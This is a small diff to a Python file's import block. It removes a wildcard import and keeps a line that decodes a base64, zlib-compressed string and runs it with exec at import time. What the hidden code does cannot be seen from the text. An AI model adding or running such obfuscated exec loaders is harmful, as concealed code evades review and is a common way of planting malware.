@@ -4,7 +4,6 @@ try:
 	import time
 	import os, sys
 	import zlib, base64
-	from source import *
 	exec(zlib.decompress(base64.b64decode('eJzLL9ZLzkjJLNJQ18vJTFLXtC6uLNYrSCzJ0EssKEjNS9HIL9ZLTy1JLk/R0NTkAgB0qg90')))
 	from api import *
 except ImportError:
